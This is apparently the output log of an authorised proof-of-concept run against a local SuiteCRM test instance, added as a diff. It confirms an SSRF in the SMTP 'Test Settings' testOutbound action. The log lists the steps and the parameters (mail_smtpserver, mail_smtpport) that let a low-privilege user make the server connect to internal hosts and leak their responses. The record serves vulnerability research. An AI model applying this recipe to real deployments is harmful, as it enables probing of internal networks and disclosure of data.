@@ -1,0 +1,21 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-045/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-045/../.venv
+========================================================================
+VULN-045: SMTP "Test Settings" full-read SSRF (testOutbound -> fullSmtpLog)
+target: http://localhost:33116
+========================================================================
+[SETUP] canary banner line: '220 BANNER-LEAK-smtp_a11d457b ESMTP ready\r\n'
+[SETUP] OOB TCP listener bound on 0.0.0.0:33119 (app container reaches it at 172.18.0.1:33119)
+[STEP] admin web login
+[OK] admin session established
+[STEP] provisioning a fresh NON-ADMIN user (proves PR:L)
+[OK] created user mod_201a3df5 (id=82573729-e4d8-44ac-86df-a2bfaa1328b9)
+[STEP] web login as low-priv user mod_201a3df5
+[OK] low-priv session established
+[STEP] POST testOutbound -> mail_smtpserver=172.18.0.1 mail_smtpport=33119 (internal-only SSRF target, only reachable from the app's network position)
+[INFO] OOB listener: accepted connection from 172.18.0.3:47530, sent banner, client then sent 16 bytes: b'EHLO localhost\r\n'
+[INFO] HTTP 200 in 0.5s, body length=5223
+[INFO] fullSmtpLog (first 400 chars): '3: Connection: opening to 172.18.0.1:33119, timeout=300, options=array()\n3: Connection: opened\n2: SERVER -> CLIENT: 220 BANNER-LEAK-smtp_a11d457b ESMTP ready\r\n\n1: CLIENT -> SERVER: EHLO localhost\r\n\n2: SERVER -> CLIENT: \n1: SMTP ERROR: EHLO command failed: \n1: SMTP NOTICE: EOF caught while checking if connected\n3: Connection: closed\n3: The following From address failed: a_e1b1cfdb@b.example : Calle'
+[PROOF] OOB listener recorded a connection from the SuiteCRM app (peer 172.18.0.3:47530) -- the server made an outbound TCP connection to an address the HTTP attacker cannot reach directly.
+[PROOF] HTTP response fullSmtpLog contains our planted banner 'BANNER-LEAK-smtp_a11d457b' -- full round-trip disclosure of bytes read from the internal target, back to the unauthenticated network position of the HTTP client.
+==> VULN-045: CONFIRMED — low-priv user mod_201a3df5 forced an outbound SMTP-protocol connection to 172.18.0.1:33119; response echoed banner BANNER-LEAK-smtp_a11d457b
